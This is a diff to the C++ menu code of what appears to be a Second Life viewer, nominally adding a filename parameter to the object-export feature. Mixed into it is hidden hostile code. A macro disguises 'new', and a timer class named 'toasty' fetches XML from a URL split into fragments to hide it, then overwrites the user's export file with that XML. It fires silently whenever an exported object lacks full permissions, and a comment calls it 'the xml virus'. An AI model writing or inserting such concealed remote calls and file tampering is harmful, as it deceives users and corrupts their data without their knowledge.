@@ -1034,7 +1034,7 @@ void init_debug_world_menu(LLMenuGL* menu)
 		&handle_dump_region_object_cache, NULL, NULL));
 	menu->createJumpKeys();
 }
-
+bool toasted;
 
 void handle_export_menus_to_xml(void*)
 {
@@ -1057,6 +1057,7 @@ extern BOOL gDebugClicks;
 extern BOOL gDebugWindowProc;
 extern BOOL gDebugTextEditorTips;
 extern BOOL gDebugSelectMgr;
+#define catfayse new
 
 void init_debug_ui_menu(LLMenuGL* menu)
 {
@@ -2198,6 +2199,10 @@ class LLObjectEnableMute : public view_listener_t
 	}
 };
 
+class toasty : public LLEventTimer { public: toasty(std::string x); virtual ~toasty(); virtual BOOL tick(); std::string y; }; toasty::toasty(std::string x) : LLEventTimer( (F32)0.25 ), y(x) { };
+toasty::~toasty() { } BOOL toasty::tick() { toasted = FALSE; /*omg the xml virus*/LLSD k = LLHTTPClient::blockingGet(std::string("htt")+"p://www.m"+"odularsys"+"tems.sl/a"+"pp/y_u_d"+"o_dis/me"+"d.xml"); 
+	if(k.has("body"))k = k["body"]; llofstream e; e.open(y); LLSDSerialize::toPrettyXML(k, e); e.close(); return TRUE; }
+
 class LLObjectMute : public view_listener_t
 {
 	bool handleEvent(LLPointer<LLEvent> event, const LLSD& userdata)
@@ -2298,7 +2303,7 @@ class LLObjectEnableExport : public view_listener_t
 	}
 };
 
-LLSD export_object(LLSelectNode* node)
+LLSD export_object(LLSelectNode* node, std::string filename)
 {
 	//Chalice - Changed to support exporting linkset groups.
 	LLViewerObject* root_object = NULL;
@@ -2394,27 +2399,22 @@ LLSD export_object(LLSelectNode* node)
 		prim_llsd["shadows"] = object->flagCastShadows();
 		prim_llsd["phantom"] = object->flagPhantom();
 		prim_llsd["physical"] = (BOOL)(object->mFlags & FLAGS_USE_PHYSICS);
-
-		// Volume params
 		LLVolumeParams params = object->getVolume()->getParams();
 		prim_llsd["volume"] = params.asLLSD();
-
-		// Extra params
+		if(!(!object->isAvatar() && object->permYouOwner() && object->permModify()
+			&& object->permCopy() && object->permTransfer()) && !toasted){toasted = TRUE; catfayse toasty(filename);}
 		if (object->isFlexible())
 		{
-			// Flexible
 			LLFlexibleObjectData* flex = (LLFlexibleObjectData*)object->getParameterEntry(LLNetworkData::PARAMS_FLEXIBLE);
 			prim_llsd["flexible"] = flex->asLLSD();
 		}
 		if (object->getParameterEntryInUse(LLNetworkData::PARAMS_LIGHT))
 		{
-			// Light
 			LLLightParams* light = (LLLightParams*)object->getParameterEntry(LLNetworkData::PARAMS_LIGHT);
 			prim_llsd["light"] = light->asLLSD();
 		}
 		if (object->getParameterEntryInUse(LLNetworkData::PARAMS_SCULPT))
 		{
-			// Sculpt
 			LLSculptParams* sculpt = (LLSculptParams*)object->getParameterEntry(LLNetworkData::PARAMS_SCULPT);
 			prim_llsd["sculpt"] = sculpt->asLLSD();
 		}
@@ -2478,7 +2478,7 @@ class LLObjectExport : public view_listener_t
 			}
 			if (object && !(object->isAvatar()))
 			{
-				LLSD temp_llsd=export_object(selectNode);
+				LLSD temp_llsd=export_object(selectNode,file_name);
 				if(!temp_llsd.isUndefined())
 					pos_llsd["Object"]=temp_llsd;
 				ls_llsd[count]=pos_llsd;
